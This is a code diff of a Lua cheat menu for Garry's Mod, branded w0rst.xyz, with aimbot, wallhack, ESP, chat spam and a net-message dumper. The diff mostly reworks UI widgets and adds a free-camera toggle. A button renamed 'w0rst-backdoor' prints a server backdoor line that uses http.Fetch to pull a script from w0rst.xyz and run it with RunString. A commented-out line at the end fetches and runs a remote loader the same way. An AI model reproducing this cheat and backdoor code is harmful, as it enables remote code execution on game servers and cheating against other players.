@@ -18,13 +18,27 @@ local RelayHook, KeyHook, EspHook = wtf.gString(), wtf.gString(), wtf.gString()
 local SelectedNet, SelectedPlr = "NONE", "NONE"
 
 local enable = {
-    ['Ent3DBox'] = false, ['FlashSpam'] = false, ['PhyRainbow'] = false,
-    ['Tracer'] = false, ['Distance'] = false, ['Name'] = false,
-    ['Weapon'] = false, ['Wallhack'] = false, ['Chams'] = false,
-    ['Box3D'] = false, ['Box2D'] = false, ['Skeleton'] = false,
-    ['ChatSpam'] = false, ['EntName'] = false, ['EntDistance'] = false,
-    ['Aimbot'] = false, ['AutoFire'] = false, ['AntiRecoil'] = false,
-    ['UseSpam'] = false, ['Bhop'] = false
+    ['Ent3DBox'] = false,
+    ['FlashSpam'] = false, 
+    ['PhyRainbow'] = false,
+    ['Tracer'] = false, 
+    ['Distance'] = false, 
+    ['Name'] = false,
+    ['Weapon'] = false, 
+    ['Wallhack'] = false, 
+    ['Chams'] = false,
+    ['Box3D'] = false, 
+    ['Box2D'] = false, 
+    ['Skeleton'] = false,
+    ['ChatSpam'] = false, 
+    ['EntName'] = false, 
+    ['EntDistance'] = false,
+    ['Aimbot'] = false, 
+    ['AutoFire'] = false, 
+    ['AntiRecoil'] = false,
+    ['UseSpam'] = false, 
+    ['Bhop'] = false, 
+    ['FreeCamera'] = false 
 }
 
 local color = {
@@ -59,7 +73,8 @@ local responses = {
     "w0rst.xyz - Tapped slave who next??",
     "w0rst.xyz - Our cheat aint ratted",
     "w0rst.xyz - wmenu what??",
-    "w0rst.xyz - little fishes take the bait"
+    "w0rst.xyz - little fishes take the bait",
+    "w0rst.xyz - owned by a non ratted cheat"
 }
 
 local function Relay()
@@ -355,24 +370,48 @@ end
 
 local function CreateCheckbox(name, tab, x, y, func)
     local Frame=vgui.Create("DFrame", tab)
-    Frame:SetSize(110,25)
-    Frame:SetPos(x,y)
+    Frame:SetSize(110, 25)
+    Frame:SetPos(x, y)
     Frame:SetDraggable(false)
     Frame:ShowCloseButton(false)
     Frame:SetTitle("")
-    Frame.Paint = function(self, w,h)
-        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
+    Frame.Paint = function(self, w, h)
+        draw.RoundedBox(0,0,0, w, h, Color(35, 35, 35, 255))
         surface.SetDrawColor(40, 40, 40, 255)
-        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
+        surface.DrawOutlinedRect(0,0, w, h)
+        draw.SimpleText(name, "DermaDefault", 25, 5, Color(255,255,255,255))
     end
 
-    local Checkbox = Frame:Add("DCheckBoxLabel")
-    Checkbox:SetPos(5,5)
-    Checkbox:SetText(name)
-    Checkbox:SetDark(true)
-    Checkbox.OnChange = func
-    Checkbox.Paint = function(self, w, h)
-        self:SetTextColor(Color(255,255,255))
+    local Button = vgui.Create("DButton", Frame)
+    Button:SetSize(15,15)
+    Button:SetPos(5,5)
+    Button:SetText("")
+    Button.Paint = function(self, w, h)
+        surface.SetDrawColor(30, 30, 30, 255)
+        surface.DrawRect(0, 0, w, h)
+        surface.SetDrawColor(30, 30, 30, 255)
+        surface.DrawOutlinedRect(0,0, w, h)
+    end
+
+    local Toggled = false
+    Button.DoClick = function()
+        if Toggled then 
+            Toggled = false; func()
+            Button.Paint = function(self, w, h)
+                surface.SetDrawColor(30, 30, 30, 255)
+                surface.DrawRect(0, 0, w, h)
+                surface.SetDrawColor(30, 30, 30, 255)
+                surface.DrawOutlinedRect(0,0, w, h)
+            end
+        else 
+            Toggled = true; func()
+            Button.Paint = function(self, w, h)
+                surface.SetDrawColor(25.5, 25.5, 25.5, 255)
+                surface.DrawRect(0, 0, w, h)
+                surface.SetDrawColor(30, 30, 30, 255)
+                surface.DrawOutlinedRect(0,0, w, h)
+            end
+        end
     end
 end
 
@@ -385,9 +424,10 @@ local function CreateSlider(name, table, tab, max, min, x, y)
     Frame:SetVisible(true)
     Frame:SetTitle(" ")
     Frame.Paint = function(self, w,h)
-        surface.SetDrawColor(Color(15,15,15,255))
-        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-        draw.SimpleText(name, "Default", 7, 5, Color(170,170,170,200))
+        draw.RoundedBox(0,0,0, w, h, Color(35, 35, 35, 255))
+        surface.SetDrawColor(40, 40, 40, 255)
+        surface.DrawOutlinedRect(0,0, w, h)
+        draw.SimpleText(name, "DermaDefault", 7, 5, Color(200,200,200,200))
     end
 
     local Slider = vgui.Create( "DNumSlider", Frame )
@@ -731,7 +771,6 @@ local function CreateSoundButtons()
 end
 
 local FreeCamera = {
-    ['Enabled'] = false,
     ['SetView'] = false
 }
 
@@ -742,7 +781,7 @@ FreeCamera.Hook = wtf.gString()
 FreeCamera.Speed = .97
 
 function FreeCamera.CalcView(ply, origin, angles, fov)
-    if not FreeCamera['Enabled'] then return end
+    if not enable['FreeCamera'] then return end
     if FreeCamera['SetView'] then
         FreeCamera.ViewOrigin = origin
         FreeCamera.ViewAngle = angles
@@ -755,7 +794,7 @@ function FreeCamera.CalcView(ply, origin, angles, fov)
 end
 
 function FreeCamera.CreateMove(cmd)
-    if not FreeCamera['Enabled'] then return end
+    if not enable['FreeCamera'] then return end
     local time, sensitivity = FrameTime(), 0.025
     FreeCamera.ViewOrigin = FreeCamera.ViewOrigin + (FreeCamera.Velocity * time)
     FreeCamera.Velocity = FreeCamera.Velocity * FreeCamera.Speed
@@ -1197,8 +1236,8 @@ CreateCheckbox("Wallhack", VisualsTab[1], 382, 70, function()
 end)
 
 CreateCheckbox("Free Camera", VisualsTab[1], 22, 100, function()
-    FreeCamera['Enabled'] = not FreeCamera['Enabled']
-    if FreeCamera['Enabled'] then
+    enable['FreeCamera'] = not enable['FreeCamera']
+    if enable['FreeCamera'] then
         FreeCamera['SetView'] = true
         wtf.Log("Freecam Enabled")
     else
@@ -1719,7 +1758,7 @@ CreateButton("Net-Dumper", MiscTab[1], 110, 25, 140, 10, function()
     wtf.conoutRGB("NET DUMP LOCATION: GarrysMod\\garrysmod\\data\\"..name)
 end)
 
-CreateButton("W0RST-BD | Method", MiscTab[1], 110, 25, 260, 10, function()
+CreateButton("w0rst-backdoor", MiscTab[1], 110, 25, 260, 10, function()
     MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm', RunString) end)\n")
     wtf.Log("Check Console")
 end)
@@ -1840,4 +1879,4 @@ CreateSoundButtons()
 -- end)
 
 --/ http.Fetch("https://w0rst.xyz/script/load", RunString)
---/ Create new checkboxes
+--/ create new sliders
